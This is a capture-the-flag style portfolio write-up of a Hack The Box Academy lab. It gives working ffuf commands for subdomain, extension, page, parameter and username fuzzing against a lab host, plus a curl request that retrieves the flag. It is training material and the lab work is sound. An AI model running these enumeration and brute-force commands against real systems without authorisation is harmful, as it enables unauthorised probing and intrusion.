
# Reconnaissance and Fuzzing with FFUF

**Author:** Jordan Davis  
**Project Type:** Cybersecurity Portfolio Project  
**Platform:** Hack The Box Academy  

---

## 📌 Executive Summary

This assessment demonstrates real-world reconnaissance and fuzzing techniques using FFUF (Fuzz Faster U Fool) within a controlled lab environment on Hack The Box Academy. It walks through subdomain enumeration, file extension fuzzing, hidden page discovery, parameter enumeration, and value fuzzing to ultimately retrieve a sensitive flag from a web service.

This workflow mirrors foundational steps in offensive security, penetration testing, and bug bounty reconnaissance.

---

## 🎯 Objective

- Enumerate subdomains
- Discover accepted file extensions
- Identify hidden pages and directories
- Fuzz parameters and values
- Extract sensitive information using filtering and automation

---

## 🛠️ Tools & Environment

- **Tool:** FFUF (`Fuzz Faster U Fool`)
- **Wordlists:** [SecLists](https://github.com/danielmiessler/SecLists)
    - DNS
    - Web extensions
    - Directory names
    - Parameter names
    - Common usernames
- **Target Platform:** Hack The Box Academy FFUF Skill Assessment
- **System Environment:** Pwnbox (Parrot OS)

---

## 🔍 Methodology and Results

### 1. 🔎 Subdomain Discovery

**Command:**
```bash
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:39069 -H 'Host: FUZZ.academy.htb' -v -c -fs 985
```

**Identified Subdomains:**
- `test.academy.htb`
- `archive.academy.htb`
- `faculty.academy.htb`

---

### 2. 🧩 Extension Fuzzing

**Command:**
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://academy.htb:39069/index.FUZZ -v -c
```

**Identified Extensions:**
- `academy.htb`: `.php`, `.phps`
- `test.academy`, `archive.academy`: `.php`
- `faculty.academy`: `.php7`

---

### 3. 🗂️ Hidden Page Discovery

**Command:**
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:39069/courses/FUZZ -v -c -e .php,.php7,.phps -fs 287
```

**Result:**
- `http://faculty.academy.htb:39069/courses/linux-security.php7`

---

### 4. 🧪 Parameter Discovery

**Command:**
```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:39069/courses/linux-security.php7?FUZZ=test -X POST -d 'FUZZ=key' -H 'Content-type: application/x-www-form-urlencoded' -fs 774
```

**Discovered Parameters:**
- `user` (GET)
- `username` (POST)

---

### 5. 🔓 Parameter Value Fuzzing

**Command:**
```bash
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u http://faculty.academy.htb:48440/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -v -c -fs 781
```

**Flag Retrieved With:**
```bash
curl http://faculty.academy.htb:48440/courses/linux-security.php7 -X POST -d 'username=harry'
```

---

## ✅ Conclusion

This exercise showcases:
- Subdomain enumeration
- Extension fuzzing
- Directory/page discovery
- Parameter fuzzing
- Sensitive data extraction through automation

These are foundational web reconnaissance techniques used in professional penetration testing and bug bounty workflows. The methodology used here reflects practical industry standards, and this write-up serves as a strong demonstration of recon and fuzzing skillset for a cybersecurity portfolio.

---

> 📂 A copy of this write-up is also available as a downloadable [PDF version](./FFUF_Recon_Portfolio_Writeup_Jordan_Davis_Formatted.pdf) in this repository.
